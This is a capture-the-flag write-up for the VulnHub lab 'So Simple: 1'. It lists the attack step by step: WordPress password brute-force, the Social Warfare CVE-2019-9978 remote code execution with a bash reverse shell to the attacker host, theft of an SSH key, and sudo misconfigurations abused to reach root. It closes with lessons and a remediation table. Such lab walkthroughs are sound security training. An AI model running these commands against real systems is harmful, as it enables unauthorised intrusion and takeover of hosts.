# So Simple: 1 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.56.105 |
| **Difficulty** | Easy/Medium |
| **OS** | Linux |
| **Goal** | root flag |
| **Source** | [HackingArticles](https://www.hackingarticles.in/so-simple1-vulnhub-walkthrough/) |

## Attack Summary

WordPress credential brute-force gives admin access; Social Warfare plugin RCE delivers a reverse shell; an exposed SSH private key enables lateral movement; two chained sudo misconfigurations escalate from `www-data` to `max` to `steven` to `root`.

## Methodology

1. Recon — arp-scan, nmap
2. Enumeration — gobuster, wpscan, user and plugin discovery
3. Exploitation — WordPress credential attack, Social Warfare RCE (CVE-2019-9978)
4. Privilege Escalation — SSH key, sudo path traversal, writable sudo script

## Step 1: Reconnaissance

Discover the target on the local subnet:

```bash
arp-scan -l
```

```bash
nmap -sV -sC -p- $TARGET
```

![nmap scan](images/01-nmap.png)

Open ports: **22** (SSH) and **80** (HTTP).

## Step 2: Web Enumeration

Enumerate directories to locate the WordPress installation:

```bash
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

WordPress is found. Enumerate users and plugins with wpscan:

```bash
wpscan --url http://$TARGET --enumerate u,vp
```

![wpscan](images/02-wpscan.png)

User discovered: **max**. The Social Warfare plugin version **3.5.0** is installed.

## Step 3: WordPress Password Brute-Force

```bash
wpscan --url http://$TARGET --username max --passwords /usr/share/wordlists/rockyou.txt
```

Credentials found: `max` / `opensesame`.

## Step 4: Social Warfare RCE (CVE-2019-9978)

Social Warfare 3.5.0 allows unauthenticated remote code execution via the debug endpoint. Create a payload file on the attacker:

```bash
cat > payload.txt << 'EOF'
<pre>system('id')</pre>
EOF
```

Host it:

```bash
python3 -m http.server 80
```

Test execution by requesting the payload through the plugin:

```bash
curl "http://$TARGET/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://$LHOST/payload.txt"
```

The `id` output in the response confirms RCE as `www-data`.

Prepare a reverse shell payload:

```bash
cat > payload.txt << 'EOF'
<pre>system("bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'")</pre>
EOF
```

Start the listener:

```bash
nc -lvnp $LPORT
```

Trigger it:

```bash
curl "http://$TARGET/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://$LHOST/payload.txt"
```

![reverse shell](images/03-revshell.png)

Reverse shell received as `www-data`.

## Step 5: Lateral Movement to max via SSH Key

Search the WordPress installation for sensitive files:

```bash
find /home/max -name "*.pub" -o -name "id_rsa" 2>/dev/null
cat /home/max/.ssh/id_rsa
```

Copy the private key to the attacker machine and set permissions:

```bash
chmod 600 max_id_rsa
ssh -i max_id_rsa max@$TARGET
```

SSH session established as `max`.

## Step 6: Privilege Escalation — max to steven

Check sudo permissions as max:

```bash
sudo -l
```

max can run `/usr/sbin/service` as `steven` without a password. Exploit the path traversal in the service binary:

```bash
sudo -u steven /usr/sbin/service ../../bin/bash
```

Shell obtained as `steven`.

![steven shell](images/04-steven-shell.png)

## Step 7: Privilege Escalation — steven to root

Check steven's sudo permissions:

```bash
sudo -l
```

steven can run `/opt/tools/server-health.sh` as root without a password, but the script does not exist yet. Create it:

```bash
mkdir -p /opt/tools
cat > /opt/tools/server-health.sh << 'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /opt/tools/server-health.sh
```

Execute it with sudo:

```bash
sudo /opt/tools/server-health.sh
```

Root shell obtained.

## Step 8: Root Flag

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/flag.txt
```

![root flag](images/05-root-flag.png)

## Lessons Learned

1. WordPress credential brute-force is practical when wpscan can enumerate usernames and the password policy is weak.
2. Unpatched plugins with known CVEs (Social Warfare 3.5.0) provide unauthenticated RCE without any authentication bypass.
3. Storing a user's SSH private key in a world-readable location within the WordPress directory allows lateral movement from the web server process to that user.
4. A `sudo` entry for `/usr/sbin/service` can be abused for path traversal to spawn an arbitrary shell as the target user.
5. Allowing a non-root user to run a non-existent script as root via `sudo` is equivalent to granting unrestricted root access.

## Remediation

| Vulnerability | Fix |
|---|---|
| Weak WordPress password | Enforce strong passwords; use two-factor authentication on wp-admin |
| Social Warfare 3.5.0 RCE | Update to a patched version (3.5.3+); keep all plugins current |
| Exposed SSH private key | Store keys in `~/.ssh/` with mode 600; never place them in web-accessible paths |
| Sudo path traversal via `service` | Restrict sudo to full absolute paths of specific commands; use `securepath` |
| Writable sudo script path | Ensure sudo-allowed scripts exist and are owned by root with mode 755; never grant sudo to non-existent files |
